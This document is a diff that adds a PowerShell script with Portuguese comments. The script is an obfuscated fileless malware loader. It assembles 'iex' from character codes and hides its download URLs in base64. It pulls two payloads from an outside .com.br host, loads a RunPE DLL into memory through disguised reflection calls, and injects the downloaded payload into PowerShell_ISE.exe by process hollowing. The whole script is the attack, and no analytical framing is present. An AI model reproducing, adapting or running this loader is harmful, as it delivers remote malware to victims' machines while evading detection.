@@ -1,0 +1,25 @@
+# Monta função IE executável (iex)
+$iexCmd = [char]73 + [char]69 + [char]88
+sal execMem $iexCmd
+
+# Função para decodificar Base64
+function d64($s) {
+    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
+}
+
+# Monta URLs de forma ofuscada
+$u1 = ('aHR0cHM6Ly92ZW5kYXNkZXNpc3Rlcy5jb20uYnIvdmVudW1lbnRyYWRhLnR4dA==')  # venumentrada.txt
+$u2 = ('aHR0cHM6Ly92ZW5kYXNkZXNpc3Rlcy5jb20uYnIvcnVucGUudHh0')              # runpe.txt
+
+# Baixa e decodifica diretamente na memória
+$server = [System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString((d64 $u1)))
+$dll = [System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString((d64 $u2)))
+
+# Monta [System.AppDomain]::CurrentDomain.Load
+$ref = '[System.Ap##X##ain]'.Replace('##X##', 'pDom') | execMem
+$dom = $ref.GetMethod('get_CurrentDomain')
+$cd = '$dom.In##X##ke($null,$null)'.Replace('##X##', 'vo') | execMem
+$load = '$cd.Lo##Y##ad($dll)'.Replace('##Y##', '') | execMem
+
+# Executa o shell (fileless)
+[RunPE.RunPE]::Execute('C:\Windows\syswow64\WindowsPowerShell\v1.0\PowerShell_ISE.exe', $server)
